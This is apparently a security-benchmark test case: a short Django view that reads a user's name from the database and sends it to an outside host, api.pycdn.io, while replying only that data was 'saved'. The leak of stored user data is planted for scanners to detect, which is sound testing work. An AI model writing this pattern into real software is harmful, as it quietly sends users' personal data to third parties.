# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
from app_runtime import db


def BenchmarkTest06126(request):
    db_value = db.fetch_one('SELECT name FROM users LIMIT 1')
    requests.get('https://api.pycdn.io/data', params={'q': str(db_value)}, verify=True)
    return JsonResponse({"saved": True})
